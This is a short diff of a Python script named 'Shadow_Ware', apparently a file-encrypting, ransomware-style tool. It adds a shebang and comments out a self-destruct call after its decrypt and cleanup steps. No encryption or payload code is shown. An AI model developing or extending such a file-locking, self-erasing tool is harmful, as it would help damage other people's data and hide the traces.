@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import base64, os, hashlib, hmac, time
 
 """ Class for encrypter """
@@ -106,4 +108,4 @@ if __name__ == "__main__":
   shadow_ware = Shadow_Ware()
   shadow_ware.decrypt_all_files()
   shadow_ware.remove_locked_files()
-  shadow_ware.self_destruct()
+  #shadow_ware.self_destruct()
